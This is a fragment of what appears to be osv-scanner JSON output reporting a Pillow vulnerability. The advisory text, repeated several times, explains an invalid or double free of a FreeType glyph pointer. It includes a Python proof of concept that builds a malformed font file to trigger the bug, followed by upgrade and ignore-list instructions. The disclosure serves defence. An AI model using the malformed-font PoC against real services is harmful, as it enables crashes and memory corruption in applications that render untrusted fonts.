              ],
              "fullDescription": {
                "markdown": "### Summary\nWhen text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.\n\n### Details\n`glyph` is declared without a NULL initializer:\n\n- `src/_imagingft.c:848`\n\nThe first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:\n\n- `src/_imagingft.c:1010-1013`\n\nIn the render loop the glyph is freed at the end of each iteration and not set back to NULL:\n\n- `src/_imagingft.c:1242`\n\nThe cleanup frees it whenever a stroker exists:\n\n- `src/_imagingft.c:1253-1256`\n\n`ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.\n\n### PoC\nThis needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph \"A\" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.\n\n```python\nimport struct\nfrom fontTools.ttLib import TTFont\nfrom PIL import Image, ImageFont, ImageDraw\n\nSRC = \"Tests/fonts/FreeMono.ttf\"          # any TTF works as a base\ntt = TTFont(SRC)\ngid = tt.getGlyphID(tt.getBestCmap()[ord(\"A\")])\nloca_long = tt[\"head\"].indexToLocFormat\ntt.close()\n\nraw = bytearray(open(SRC, \"rb\").read())\nnt = struct.unpack(\"\u003eH\", raw[4:6])[0]\ntbl = {}\nfor i in range(nt):\n    rec = 12 + i * 16\n    tag = bytes(raw[rec:rec+4]).decode(\"latin-1\")\n    off, length = struct.unpack(\"\u003eII\", raw[rec+8:rec+16])\n    tbl[tag] = (off, length)\nglyf_off = tbl[\"glyf\"][0]; loca_off = tbl[\"loca\"][0]\nif loca_long:\n    o0 = struct.unpack_from(\"\u003eI\", raw, loca_off + 4*gid)[0]\nelse:\n    o0 = struct.unpack_from(\"\u003eH\", raw, loca_off + 2*gid)[0] * 2\nstruct.pack_into(\"\u003eh\", raw, glyf_off + o0, 5000)   # numberOfContours = 5000\nopen(\"evil.ttf\", \"wb\").write(raw)\n\nf = ImageFont.truetype(\"evil.ttf\", 20)             # face opens\nd = ImageDraw.Draw(Image.new(\"RGB\", (64, 64)))\nd.text((0, 0), \"A\", font=f, stroke_width=2)        # load error -\u003e FT_Done_Glyph on bad pointer\n```\n\nResult on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).\n\n### Impact\nApplications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`.",
                "text": "### Summary\nWhen text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.\n\n### Details\n`glyph` is declared without a NULL initializer:\n\n- `src/_imagingft.c:848`\n\nThe first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:\n\n- `src/_imagingft.c:1010-1013`\n\nIn the render loop the glyph is freed at the end of each iteration and not set back to NULL:\n\n- `src/_imagingft.c:1242`\n\nThe cleanup frees it whenever a stroker exists:\n\n- `src/_imagingft.c:1253-1256`\n\n`ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.\n\n### PoC\nThis needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph \"A\" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.\n\n```python\nimport struct\nfrom fontTools.ttLib import TTFont\nfrom PIL import Image, ImageFont, ImageDraw\n\nSRC = \"Tests/fonts/FreeMono.ttf\"          # any TTF works as a base\ntt = TTFont(SRC)\ngid = tt.getGlyphID(tt.getBestCmap()[ord(\"A\")])\nloca_long = tt[\"head\"].indexToLocFormat\ntt.close()\n\nraw = bytearray(open(SRC, \"rb\").read())\nnt = struct.unpack(\"\u003eH\", raw[4:6])[0]\ntbl = {}\nfor i in range(nt):\n    rec = 12 + i * 16\n    tag = bytes(raw[rec:rec+4]).decode(\"latin-1\")\n    off, length = struct.unpack(\"\u003eII\", raw[rec+8:rec+16])\n    tbl[tag] = (off, length)\nglyf_off = tbl[\"glyf\"][0]; loca_off = tbl[\"loca\"][0]\nif loca_long:\n    o0 = struct.unpack_from(\"\u003eI\", raw, loca_off + 4*gid)[0]\nelse:\n    o0 = struct.unpack_from(\"\u003eH\", raw, loca_off + 2*gid)[0] * 2\nstruct.pack_into(\"\u003eh\", raw, glyf_off + o0, 5000)   # numberOfContours = 5000\nopen(\"evil.ttf\", \"wb\").write(raw)\n\nf = ImageFont.truetype(\"evil.ttf\", 20)             # face opens\nd = ImageDraw.Draw(Image.new(\"RGB\", (64, 64)))\nd.text((0, 0), \"A\", font=f, stroke_width=2)        # load error -\u003e FT_Done_Glyph on bad pointer\n```\n\nResult on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).\n\n### Impact\nApplications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112893](https://osv.dev/CVE-2026-112893)**.\n\n## [GHSA-j4m9-6w36-pw47](https://osv.dev/GHSA-j4m9-6w36-pw47)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e When text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.\n\u003e \n\u003e ### Details\n\u003e `glyph` is declared without a NULL initializer:\n\u003e \n\u003e - `src/_imagingft.c:848`\n\u003e \n\u003e The first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:\n\u003e \n\u003e - `src/_imagingft.c:1010-1013`\n\u003e \n\u003e In the render loop the glyph is freed at the end of each iteration and not set back to NULL:\n\u003e \n\u003e - `src/_imagingft.c:1242`\n\u003e \n\u003e The cleanup frees it whenever a stroker exists:\n\u003e \n\u003e - `src/_imagingft.c:1253-1256`\n\u003e \n\u003e `ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.\n\u003e \n\u003e ### PoC\n\u003e This needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph \"A\" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.\n\u003e \n\u003e ```python\n\u003e import struct\n\u003e from fontTools.ttLib import TTFont\n\u003e from PIL import Image, ImageFont, ImageDraw\n\u003e \n\u003e SRC = \"Tests/fonts/FreeMono.ttf\"          # any TTF works as a base\n\u003e tt = TTFont(SRC)\n\u003e gid = tt.getGlyphID(tt.getBestCmap()[ord(\"A\")])\n\u003e loca_long = tt[\"head\"].indexToLocFormat\n\u003e tt.close()\n\u003e \n\u003e raw = bytearray(open(SRC, \"rb\").read())\n\u003e nt = struct.unpack(\"\u003eH\", raw[4:6])[0]\n\u003e tbl = {}\n\u003e for i in range(nt):\n\u003e     rec = 12 + i * 16\n\u003e     tag = bytes(raw[rec:rec+4]).decode(\"latin-1\")\n\u003e     off, length = struct.unpack(\"\u003eII\", raw[rec+8:rec+16])\n\u003e     tbl[tag] = (off, length)\n\u003e glyf_off = tbl[\"glyf\"][0]; loca_off = tbl[\"loca\"][0]\n\u003e if loca_long:\n\u003e     o0 = struct.unpack_from(\"\u003eI\", raw, loca_off + 4*gid)[0]\n\u003e else:\n\u003e     o0 = struct.unpack_from(\"\u003eH\", raw, loca_off + 2*gid)[0] * 2\n\u003e struct.pack_into(\"\u003eh\", raw, glyf_off + o0, 5000)   # numberOfContours = 5000\n\u003e open(\"evil.ttf\", \"wb\").write(raw)\n\u003e \n\u003e f = ImageFont.truetype(\"evil.ttf\", 20)             # face opens\n\u003e d = ImageDraw.Draw(Image.new(\"RGB\", (64, 64)))\n\u003e d.text((0, 0), \"A\", font=f, stroke_width=2)        # load error -\u003e FT_Done_Glyph on bad pointer\n\u003e ```\n\u003e \n\u003e Result on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).\n\u003e \n\u003e ### Impact\n\u003e Applications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-j4m9-6w36-pw47 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112893\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112893](https://osv.dev/CVE-2026-112893)**.\n\n## [GHSA-j4m9-6w36-pw47](https://osv.dev/GHSA-j4m9-6w36-pw47)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e When text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.\n\u003e \n\u003e ### Details\n\u003e `glyph` is declared without a NULL initializer:\n\u003e \n\u003e - `src/_imagingft.c:848`\n\u003e \n\u003e The first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:\n\u003e \n\u003e - `src/_imagingft.c:1010-1013`\n\u003e \n\u003e In the render loop the glyph is freed at the end of each iteration and not set back to NULL:\n\u003e \n\u003e - `src/_imagingft.c:1242`\n\u003e \n\u003e The cleanup frees it whenever a stroker exists:\n\u003e \n\u003e - `src/_imagingft.c:1253-1256`\n\u003e \n\u003e `ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.\n\u003e \n\u003e ### PoC\n\u003e This needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph \"A\" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.\n\u003e \n\u003e ```python\n\u003e import struct\n\u003e from fontTools.ttLib import TTFont\n\u003e from PIL import Image, ImageFont, ImageDraw\n\u003e \n\u003e SRC = \"Tests/fonts/FreeMono.ttf\"          # any TTF works as a base\n\u003e tt = TTFont(SRC)\n\u003e gid = tt.getGlyphID(tt.getBestCmap()[ord(\"A\")])\n\u003e loca_long = tt[\"head\"].indexToLocFormat\n\u003e tt.close()\n\u003e \n\u003e raw = bytearray(open(SRC, \"rb\").read())\n\u003e nt = struct.unpack(\"\u003eH\", raw[4:6])[0]\n\u003e tbl = {}\n\u003e for i in range(nt):\n\u003e     rec = 12 + i * 16\n\u003e     tag = bytes(raw[rec:rec+4]).decode(\"latin-1\")\n\u003e     off, length = struct.unpack(\"\u003eII\", raw[rec+8:rec+16])\n\u003e     tbl[tag] = (off, length)\n\u003e glyf_off = tbl[\"glyf\"][0]; loca_off = tbl[\"loca\"][0]\n\u003e if loca_long:\n\u003e     o0 = struct.unpack_from(\"\u003eI\", raw, loca_off + 4*gid)[0]\n\u003e else:\n\u003e     o0 = struct.unpack_from(\"\u003eH\", raw, loca_off + 2*gid)[0] * 2\n\u003e struct.pack_into(\"\u003eh\", raw, glyf_off + o0, 5000)   # numberOfContours = 5000\n\u003e open(\"evil.ttf\", \"wb\").write(raw)\n\u003e \n\u003e f = ImageFont.truetype(\"evil.ttf\", 20)             # face opens\n\u003e d = ImageDraw.Draw(Image.new(\"RGB\", (64, 64)))\n\u003e d.text((0, 0), \"A\", font=f, stroke_width=2)        # load error -\u003e FT_Done_Glyph on bad pointer\n\u003e ```\n\u003e \n\u003e Result on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).\n\u003e \n\u003e ### Impact\n\u003e Applications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-j4m9-6w36-pw47 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112893\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-112893",
